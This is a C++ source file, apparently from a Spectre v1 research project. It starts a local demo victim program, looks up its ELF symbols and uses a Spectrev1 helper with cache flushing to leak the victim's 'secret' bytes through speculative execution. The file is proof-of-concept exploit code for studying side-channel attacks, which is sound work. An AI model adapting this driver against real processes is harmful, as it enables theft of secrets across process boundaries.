//
// Created by sage on 1/17/21.
//
#include <stdafx.h>
#include <cacheutils.h>
#include <Spectrev1.h>
#include <lilelf.h>
#include <unistd.h>

//int main()
//{
//    // Create the victim process
//    FILE *victim_fp = popen("./Spec1Victim", "w");
//
//    auto victim = LilElf("./Spec1Victim");
//
//    // Look for symbols in victim
//    auto sym_secret = victim.get_sym("secret");
//    auto sym_array1_size = victim.get_sym("array1_size");
//    auto sym_array2 =victim.get_sym("array2");
//    auto sym_array1 = victim.get_sym("array1");
//
//    auto m_array1_size = victim.get_sym_value<void*>(sym_array1_size);
//    auto m_secret = victim.get_sym_value<uint8_t>(sym_secret);
//
//    Spectrev1 s(victim.get_sym_value<void*>(sym_array1),
//                victim.get_sym_value<void*>(sym_array2),
//                [&](volatile size_t _x){flush(m_array1_size); fprintf(victim_fp, "%llu\n", _x); },
//                [](size_t _t){return _t%16;},
//                512,
//                MAX_TRIES,
//                30
//    );
//    sleep(1);
//
//    uint8_t val;
//    for (size_t i = 0; i < sym_secret->st_size; ++i)
//    {
//        s.read_byte(&m_secret[i], &val);
//        printf("0x%02X = %c\n", val, val);
//    }
//
//    pclose(victim_fp);
//}

#define _SECRET_LEN 25
#define _BLOCK_LEN 512
#define _MAX_TRIES 1000

int main()
{
    FILE *victim_fp = popen("./Spec1Victim", "w");
    sleep(1);
    auto victim = LilElf("./Spec1Victim");

    // Look for symbols in victim
    auto sym_secret = victim.get_sym("secret");
    auto sym_array1_size = victim.get_sym("array1_size");
    auto sym_array2 = victim.get_sym("array2");
    auto sym_array1 = victim.get_sym("array1");

    auto m_array1_size = victim.get_sym_value<void*>(sym_array1_size);
    auto m_secret = victim.get_sym_value<uint8_t>(sym_secret);

    Spectrev1 s(victim.get_sym_value<void*>(sym_array1),
                victim.get_sym_value<void*>(sym_array2),
                [&](volatile size_t _x){flush(m_array1_size); fprintf(victim_fp, "%llu\n", _x); fflush(victim_fp);},
                [](size_t _t){return 15;},
                _BLOCK_LEN,
                _MAX_TRIES/4,
                13
    );


    uint8_t val;
    for (size_t i = 0; i < 25; ++i)
    {
        s.read_byte(&m_secret[i], &val);
//        printf("%02x ", val);
    }
//    printf("\n");
    pclose(victim_fp);
}

